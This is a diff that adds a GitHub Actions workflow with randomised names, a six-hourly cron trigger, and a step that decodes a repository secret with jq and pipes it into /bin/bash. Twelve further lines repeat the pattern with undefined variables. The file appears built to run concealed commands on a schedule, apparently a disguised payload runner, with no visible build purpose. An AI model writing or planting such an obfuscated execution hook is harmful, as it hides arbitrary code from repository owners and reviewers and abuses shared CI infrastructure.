@@ -1,0 +1,30 @@
+name: cxxkha
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cxxkha
+        env:
+          jylr785: ${{ secrets.jylr785 }}
+        run: |
+          echo $jylr785 | jq -r .jns95 | /bin/bash
+          echo $fjvct32 | jq -r .lg7414 | /bin/bash
+          echo $m5 | jq -r .yysp72 | /bin/bash
+          echo $kz55 | jq -r .dacdn5919 | /bin/bash
+          echo $qboaq5 | jq -r .h9 | /bin/bash
+          echo $zykph44034 | jq -r .up53030 | /bin/bash
+          echo $iu9 | jq -r .oiprh3165 | /bin/bash
+          echo $hhgq5736 | jq -r .xkkg9231 | /bin/bash
+          echo $fokn23 | jq -r .dm9 | /bin/bash
+          echo $pp1811 | jq -r .f107 | /bin/bash
+          echo $zojo91143 | jq -r .jmq92 | /bin/bash
+          echo $rxn5516 | jq -r .t77268 | /bin/bash
+          echo $tsoh2805 | jq -r .kbf7 | /bin/bash
+
